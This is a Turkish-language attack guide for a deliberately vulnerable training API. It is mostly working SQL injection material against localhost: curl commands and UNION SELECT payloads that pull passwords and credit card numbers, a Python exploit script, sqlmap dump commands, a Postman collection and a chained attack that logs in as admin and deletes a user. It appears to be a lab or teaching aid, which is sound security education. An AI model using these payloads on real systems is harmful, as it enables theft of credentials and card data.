# 🔓 ProductController - SQL Injection Saldırı Rehberi

## ⚠️ Bu Controller Kasıtlı Olarak SQL Injection Açıklarına Sahiptir!

ProductController, **6 farklı SQL Injection** zafiyeti içermektedir. Bu zafiyetler **eğitim amaçlıdır**.

---

## 🚨 Kritik Zafiyetler (Hızlı Bakış)

| # | Zafiyet | Endpoint | Saldırı Kolaylığı | Sonuç |
|---|---------|----------|-------------------|-------|
| 1 | **SQL Injection (Keyword)** | `GET /search` | ⭐⭐⭐⭐⭐ Çok Kolay | Tüm kullanıcı şifrelerini çal |
| 2 | **SQL Injection (Price)** | `GET /search-by-price` | ⭐⭐⭐⭐ Kolay | Veri sızıntısı |
| 3 | **SQL Injection (ID)** | `GET /{id}` | ⭐⭐⭐⭐ Kolay | Veri manipülasyonu |
| 4 | **Detaylı Hata Mesajları** | Tüm endpoint'ler | ⭐⭐⭐⭐⭐ Çok Kolay | Bilgi ifşası |
| 5 | **Zayıf Yetkilendirme** | `POST /` | ⭐⭐⭐ Orta | Yetkisiz ürün oluşturma |
| 6 | **Query Loglama** | `GET /search` | ⭐⭐⭐ Orta | Saldırı vektörü keşfi |

---

## 🎯 Hızlı Saldırı Senaryoları

### 1️⃣ En Kolay Saldırı: Tüm Kullanıcı Şifrelerini Çal (1 dakika)

```bash
# Tek bir komutla tüm şifreleri çal!
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22Password%22,%20%22Email%22,%200,%20%22PhoneNumber%22,%20%22CreatedAt%22%20FROM%20%22Users%22--"
```

**Sonuç:**
```json
[
  {
    "id": 1,
    "name": "admin",
    "description": "admin123",  // 🔓 Admin şifresi!
    "price": "admin@vulnerable.api"
  },
  {
 "id": 2,
    "name": "john",
    "description": "12345",  // 🔓 John'un şifresi!
    "price": "john@vulnerable.api"
  }
]
```

✅ **BAŞARILI!** 10 saniyede tüm şifreleri çaldık!

---

### 2️⃣ Kredi Kartı Bilgilerini Çal (1 dakika)

## ' UNION SELECT "Id", "Username", "CreditCardNumber", 0, 0,"Password", "CreatedAt" FROM "Users"--

```bash
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22CreditCardNumber%22,%20%22FullName%22,%200,%20%22Address%22,%20%22CreatedAt%22%20FROM%20%22Users%22--"
```

**Sonuç:**
```json
[
  {
    "id": 1,
    "name": "admin",
    "description": "4532-1234-5678-9010",  // 🔓 Kredi kartı!
 "price": "System Administrator",
  "category": "123 Admin Street"
  }
]
```

✅ **BAŞARILI!** Kredi kartı bilgilerini çaldık!

---

### 3️⃣ Tüm Ürünleri Göster (Bypass Filter) (30 saniye)

#### ' OR '1'='1

```bash
# Basit OR injection
curl "http://localhost:5000/api/product/search?keyword=%27%20OR%20%271%27=%271"
```

**Sonuç:**
```json
[
  {"id": 1, "name": "Laptop", "price": 1299.99},
  {"id": 2, "name": "Mouse", "price": 29.99},
  {"id": 3, "name": "Keyboard", "price": 89.99},
  // ... tüm ürünler
]
```

---

### 4️⃣ Price Range SQL Injection (1 dakika)

#### ' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--&maxPrice=9999--

```bash
# UNION injection ile kullanıcı bilgileri
curl "http://localhost:5000/api/product/search-by-price?minPrice=0%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22--&maxPrice=9999"
```

---

### 5️⃣ ID Parameter SQL Injection (1 dakika)

```bash
# Tüm ürünleri göster
curl "http://localhost:5000/api/product/1%20OR%201=1--"

# UNION injection
curl "http://localhost:5000/api/product/-1%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22%20WHERE%20%22Id%22=1--"
```

---

### 6️⃣ Normal Kullanıcı ile Ürün Oluştur (2 dakika)

```bash
# 1. Normal kullanıcı olarak login
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' \
  | jq -r '.token')

# 2. Ürün oluştur (admin yetkisi gerektirmemeli ama gerekmiyor!)
curl -X POST http://localhost:5000/api/product \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "name": "Unauthorized Product",
 "description": "Created by john who is not admin!",
    "price": 999.99,
    "stock": 100,
    "category": "Exploit"
  }'
```

✅ **BAŞARILI!** Normal kullanıcı ürün oluşturdu!

---

## 📊 SQL Injection Cheat Sheet

### PostgreSQL Syntax (Bu API'de Kullanılan)

| Amaç | Payload |
|------|---------|
| **Tüm ürünleri göster** | `' OR '1'='1` |
| **UNION test** | `' UNION SELECT NULL--` |
| **Kolon sayısı bul** | `' UNION SELECT 1,2,3,4,5,6,7--` |
| **Kullanıcı adları** | `' UNION SELECT "Id","Username","Email",'x',0,'x',"CreatedAt" FROM "Users"--` |
| **Şifreler** | `' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--` |
| **Kredi kartları** | `' UNION SELECT "Id","Username","CreditCardNumber","FullName",0,"Address","CreatedAt" FROM "Users"--` |
| **Comment out** | `--` veya `/*` |

### Önemli Notlar
- ✅ PostgreSQL **case-sensitive**: `"Users"` != `users`
- ✅ **7 kolon** gerekli: `Id, Name, Description, Price, Stock, Category, CreatedAt`
- ✅ **URL encode** kullan: ` ` → `%20`, `"` → `%22`

---

## 🛠️ Test Araçları

### 1. cURL (En Hızlı)

```bash
# Temel test
curl "http://localhost:5000/api/product/search?keyword=test"

# SQL Injection
curl "http://localhost:5000/api/product/search?keyword=%27%20OR%20%271%27=%271"

# UNION injection
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22--"
```

### 2. Python Script (Otomatik)

```python
#!/usr/bin/env python3
import requests
import json

base_url = "http://localhost:5000/api/product/search"

# UNION SQL Injection payload
payload = {
    "keyword": "' UNION SELECT \"Id\",\"Username\",\"Password\",\"Email\",0,\"PhoneNumber\",\"CreatedAt\" FROM \"Users\"--"
}

response = requests.get(base_url, params=payload)

if response.status_code == 200:
    data = response.json()
    print("[+] SQL Injection Successful!")
    print(f"[+] Found {len(data)} items\n")
    
    for item in data:
  # Kullanıcı bilgisi gibi görünen datayı yakala
        if item.get('stock', 1) == 0:  # Muhtemelen user data
     print(f"[!] LEAKED USER DATA:")
     print(f"    Username: {item.get('name')}")
  print(f"    Password: {item.get('description')}")
            print(f"    Email: {item.get('price')}")
     print(f"    Phone: {item.get('category')}")
          print()
else:
    print(f"[-] Request failed: {response.status_code}")
```

**Kullanım:**
```bash
python3 sqli_exploit.py
```

### 3. SQLMap (Profesyonel)

```bash
# Temel scan
sqlmap -u "http://localhost:5000/api/product/search?keyword=test" \
  --batch --dbs

# Veritabanı tabloları
sqlmap -u "http://localhost:5000/api/product/search?keyword=test" \
  --batch -D vulnerabledb --tables

# Users tablosunu dump et
sqlmap -u "http://localhost:5000/api/product/search?keyword=test" \
  --batch -D vulnerabledb -T Users --dump

# Price endpoint test
sqlmap -u "http://localhost:5000/api/product/search-by-price?minPrice=0&maxPrice=9999" \
  --batch --dump-all
```

### 4. Postman Collection

```json
{
"info": {
  "name": "SQL Injection Tests",
  "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
  {
"name": "1. Bypass Filter (OR Injection)",
 "request": {
        "method": "GET",
        "url": "{{baseUrl}}/api/product/search?keyword=' OR '1'='1"
   }
    },
    {
      "name": "2. Steal Passwords (UNION)",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/api/product/search?keyword=' UNION SELECT \"Id\",\"Username\",\"Password\",\"Email\",0,\"PhoneNumber\",\"CreatedAt\" FROM \"Users\"--"
    }
    },
    {
      "name": "3. Steal Credit Cards",
      "request": {
        "method": "GET",
  "url": "{{baseUrl}}/api/product/search?keyword=' UNION SELECT \"Id\",\"Username\",\"CreditCardNumber\",\"FullName\",0,\"Address\",\"CreatedAt\" FROM \"Users\"--"
      }
    },
    {
      "name": "4. Price Range Injection",
      "request": {
        "method": "GET",
   "url": "{{baseUrl}}/api/product/search-by-price?minPrice=0 OR 1=1--&maxPrice=9999"
   }
    },
    {
   "name": "5. ID Parameter Injection",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/api/product/1 OR 1=1--"
      }
    }
  ],
  "variable": [
 {
      "key": "baseUrl",
      "value": "http://localhost:5000"
    }
  ]
}
```

**Import et ve test et!**

---

## 🎓 Öğrenme Yolu

### Seviye 1: Başlangıç (5 dakika)

**Hedef:** Temel SQL Injection'ı anla

```bash
# 1. Basit OR injection
curl "http://localhost:5000/api/product/search?keyword=%27%20OR%20%271%27=%271"

# 2. Comment out test
curl "http://localhost:5000/api/product/search?keyword=test%27--"

# 3. UNION NULL test
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20NULL--"
```

**Öğrenilecekler:**
- ✅ SQL Injection'ın ne olduğu
- ✅ `'` karakterinin önemi
- ✅ `--` comment'in kullanımı

---

### Seviye 2: Orta (15 dakika)

**Hedef:** UNION-based injection'ı öğren

```bash
# 1. Kolon sayısını bul (7 kolon)
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%201,2,3,4,5,6,7--"

# 2. Tablo isimlerini keşfet (hata mesajlarından)
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,2,3,4,5,6,7%20FROM%20%22users%22--"
# Hata: relation "users" does not exist → Büyük U ile "Users" olmalı

# 3. Users tablosundan veri çek
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22--"
```

**Öğrenilecekler:**
- ✅ UNION SELECT kullanımı
- ✅ Kolon sayısı eşleştirme
- ✅ PostgreSQL case-sensitivity

---

### Seviye 3: İleri (30 dakika)

**Hedef:** Farklı endpoint'lerde saldırı + kombine teknikler

```bash
# 1. Price endpoint'i exploit et
curl "http://localhost:5000/api/product/search-by-price?minPrice=0%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22--&maxPrice=9999"

# 2. ID endpoint'i exploit et
curl "http://localhost:5000/api/product/-1%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22%20WHERE%20%22Id%22=1--"

# 3. SQL Injection ile admin şifresini bul
ADMIN_PASS=$(curl -s "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22%20WHERE%20%22Username%22=%27admin%27--" | jq -r '.[1].description')

# 4. Admin olarak login ol
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"admin\",\"password\":\"$ADMIN_PASS\"}" \
  | jq -r '.token')

# 5. Admin yetkisiyle işlem yap
curl -X DELETE http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN"
```

**Öğrenilecekler:**
- ✅ Farklı parametrelerde injection
- ✅ Kombine saldırılar (SQL Injection + Auth)
- ✅ Otomatik exploit scriptleri

---

## 📖 Detaylı Dökümanlar

- **[PRODUCT_ZAFIYETLER_TR.md](./PRODUCT_ZAFIYETLER_TR.md)** - Tüm zafiyetlerin detaylı Türkçe açıklaması
- **[AUTH_ZAFIYETLER_TR.md](./AUTH_ZAFIYETLER_TR.md)** - Authentication zafiyetleri

---

## 🔥 Popüler SQL Injection Payloads

### Keyword Search Endpoint

```sql
-- 1. Tüm ürünleri göster
' OR '1'='1

-- 2. Kullanıcı adları
' UNION SELECT "Id","Username","Email",'x',0,'x',"CreatedAt" FROM "Users"--

-- 3. Şifreler
' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--

-- 4. Kredi kartları
' UNION SELECT "Id","Username","CreditCardNumber","FullName",0,"Address","CreatedAt" FROM "Users"--

-- 5. Sadece admin
' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users" WHERE "Username"='admin'--

-- 6. Admin olup olmadığını kontrol et
' UNION SELECT "Id","Username","Password","Email","IsAdmin"::int,"PhoneNumber","CreatedAt" FROM "Users"--
```

### Price Range Endpoint

```sql
-- 1. Tüm ürünler
0 OR 1=1--

-- 2. UNION injection
0 UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--
```

### ID Parameter

```sql
-- 1. Tüm ürünler
1 OR 1=1--

-- 2. UNION injection
-1 UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--
```

---

## ❓ Sık Sorulan Sorular

### S: SQL Injection çalışmıyor, ne yapmalıyım?
**C:** 
1. URL encoding kontrol et: ` ` → `%20`, `"` → `%22`
2. PostgreSQL syntax kullan: `"Users"` (büyük U)
3. 7 kolon seç (Products tablosu 7 kolona sahip)
4. Hata mesajlarını oku (çok bilgi veriyorlar!)

### S: Hangi karakterleri encode etmeliyim?
**C:**
```
Space → %20
" → %22
' → %27
- → %2D
```

### S: Kolon sayısını nasıl bulurum?
**C:**
```bash
# 1 kolon dene
curl "...?keyword=' UNION SELECT 1--"
# Hata: UNION'da farklı sayıda kolon

# 7 kolon dene
curl "...?keyword=' UNION SELECT 1,2,3,4,5,6,7--"
# Başarılı!
```

### S: Tablo isimlerini nasıl öğrenirim?
**C:**
```sql
-- PostgreSQL system catalog
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--

-- Veya hata mesajlarından (bu API'de açığa çıkıyor)
' UNION SELECT 1,2,3,4,5,6,7 FROM "users"--
-- Error: relation "users" does not exist → "Users" olmalı
```

---

## 🎯 Hedef: Her Zafiyeti Öğren!

### SQL Injection Mastery Checklist

- [ ] **Temel Injection**
  - [ ] OR '1'='1 bypass
  - [ ] Comment out (--)
  - [ ] UNION SELECT NULL

- [ ] **UNION-Based**
  - [ ] Kolon sayısı bulma
  - [ ] Tablo keşfi
  - [ ] Veri çekme

- [ ] **Farklı Endpoint'ler**
  - [ ] Keyword search
  - [ ] Price range
  - [ ] ID parameter

- [ ] **İleri Teknikler**
  - [ ] Blind SQL Injection
  - [ ] Time-based detection
  - [ ] Error-based extraction

- [ ] **Kombine Saldırılar**
  - [ ] SQL Injection + Auth bypass
  - [ ] SQL Injection + IDOR
  - [ ] Full system compromise

**Tümünü tamamladın mı? Artık SQL Injection uzmanısın! 🎓**

---

## ⚠️ Güvenlik Uyarısı

### ❌ Asla Yapma
- Başkasının sisteminde test etme
- İzin almadan penetrasyon testi yapma
- Production database'de deneme
- Öğrendiklerini kötüye kullanma

### ✅ Her Zaman Yap
- Kendi test ortamında çalış
- Parameterized query kullan
- Input validation yap
- Güvenli kodlama öğren

---

## 📞 Yardım ve Kaynaklar

### Öğrenme Materyalleri
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [PostgreSQL Documentation](https://www.postgresql.org/docs/)

### Araçlar
- [SQLMap](https://sqlmap.org/)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)

---

**🔒 Güvenli kodlama!**
